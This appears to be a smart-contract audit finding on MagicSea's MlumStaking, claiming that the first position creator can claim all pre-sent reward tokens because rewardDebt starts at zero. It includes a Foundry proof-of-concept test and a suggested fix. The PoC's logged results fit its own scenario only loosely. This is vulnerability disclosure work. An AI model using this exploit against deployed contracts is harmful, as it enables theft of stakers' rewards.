# First position creator in MlumStaking would be able to harvest all reward tokens from the contract

## Summary

The first staking position would be able to gather all reward tokens if they were sent before.

## Vulnerability Detail

MlumStaking has ability to stake tokens for some reward token. Users will create their position via `createPosition` function which will allow them to harvest rewards tokens, higher lockPeriod - higher would be rewards multiplier. But the problem lies in rewards amount calculation, contract caclulates 2 amounts: how much protocol should give to the user that created a position and how much protocol is in debt to other users. When MlumStaking contract has no positions field `_accRewardsPerShare` is not initialized and because of that rewardDebt would be 0. https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L377. This means that all rewards tokens that would be sent to contract can be stolen by the user who will create a position first - because for him rewardDebt would be 0 and he would be able to claim entire rewards balance.

## Impact

A malicious user would be able to steal all reward tokens if he would create a position first.

## PoC

Add it to MlumStaking.t.sol:

```solidity
    function testCreatePositionBug() public {
        createPosition(ALICE, 1 ether);
        createPosition(BOB, 1 ether);
        _rewardToken.mint(address(_pool), 50e18);
        harvestPosition(ALICE, 1); // BUG iS HERE, RECEIVED = 50e18
        _rewardToken.mint(address(_pool), 100e18);
        harvestPosition(ALICE, 1); // RECEIVED = 50e18
        harvestPosition(BOB, 2); // RECEIVED = 50e18
        console.log("ALICE BALANCE", _rewardToken.balanceOf(ALICE)); // 100e18
        console.log("BOB BALANCE", _rewardToken.balanceOf(BOB)); //50e18
    }

    function harvestPosition(address account, uint tokenId) internal {
        vm.startPrank(account);
        uint balanceBefore = _rewardToken.balanceOf(account);
        _pool.harvestPosition(tokenId);
        uint balanceAfter = _rewardToken.balanceOf(account);
        console.log(account);
        console.log("Received  ", balanceAfter - balanceBefore);
        vm.stopPrank();
    }

    function createPosition(address account, uint amount) internal {
        _stakingToken.mint(account, amount);
        vm.startPrank(account);
        _stakingToken.approve(address(_pool), amount);
        _pool.createPosition(amount, 0);
        vm.stopPrank();
    }
```

## Tool used

Foundry.

## Recommendation

Make it so first position can be created only by owner/operator of the contract.
